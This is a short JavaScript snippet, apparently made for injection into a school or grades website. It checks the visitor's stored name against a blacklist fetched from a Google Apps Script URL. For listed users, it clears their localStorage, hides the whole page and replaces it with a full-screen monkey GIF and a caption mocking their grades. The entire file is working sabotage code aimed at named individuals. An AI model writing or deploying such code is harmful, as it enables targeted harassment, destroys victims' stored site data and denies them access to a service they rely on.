(async function() {
    // --- PASTE YOUR DEPLOYED URL HERE ---
    const BLACKLIST_API_URL = 'https://script.google.com/macros/s/AKfycbyNhGaZvsiar-kHmk8Hg0wFpPYo42KJCZ25SspufcS8IeroeyNUs_fQfJviqL7AQQBShA/exec'; 
    // ------------------------------------

    function triggerGlitchMode() {
        // 1. Inject CSS exactly matching your simulation
        const style = document.createElement('style');
        style.innerHTML = `
            /* Reset Body/HTML to black full screen */
            body, html { 
                margin: 0 !important; 
                padding: 0 !important; 
                width: 100% !important;
                height: 100% !important;
                overflow: hidden !important; 
                background-color: black !important;
            }
            
            /* The Background GIF - Forces stretching */
            #brainrot-bg {
                position: fixed;
                top: 0;
                left: 0;
                width: 100vw;
                height: 100vh;
                object-fit: fill !important; /* This makes it stretch */
                z-index: 2147483647; /* Max Z-index to stay on top */
                pointer-events: none;
            }

            /* The Caption */
            #brainrot-caption {
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                color: red !important;
                font-family: Impact, 'Arial Black', sans-serif !important;
                font-size: 6vw !important; 
                text-align: center !important;
                text-transform: uppercase !important;
                font-weight: bold !important;
                z-index: 2147483647;
                text-shadow: 3px 3px 0 #000, -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000;
                width: 100%;
            }

            /* Hide all other site elements immediately */
            body > *:not(#brainrot-bg):not(#brainrot-caption):not(style) {
                display: none !important;
            }
        `;
        document.head.appendChild(style);

        // 2. Inject the specific Monkey GIF and Text
        const img = document.createElement('img');
        img.id = 'brainrot-bg';
        // Using the exact link you provided
        img.src = "https://media.tenor.com/p_PSprNhLkkAAAAj/monkey-tongue-out.gif";
        
        const caption = document.createElement('div');
        caption.id = 'brainrot-caption';
        caption.innerText = "Roses are red, Violets are blue, Your grades are so good the site won't load";

        document.body.appendChild(img);
        document.body.appendChild(caption);
    }

    try {
        // 1. Check Local Storage for User Name
        const mbsDataString = localStorage.getItem('mbsData');
        if (!mbsDataString) return;

        const mbsData = JSON.parse(mbsDataString);
        if (!mbsData.nom) return;

        const userName = mbsData.nom.trim().toLowerCase();

        // 2. Fetch Blacklist
        const response = await fetch(BLACKLIST_API_URL);
        if (!response.ok) return; 

        const blacklist = await response.json();

        // 3. Check Match
        if (blacklist.includes(userName)) {
            localStorage.clear(); 
            triggerGlitchMode();
        }

    } catch (e) {
        console.log("Blacklist check skipped.");
    }
})();
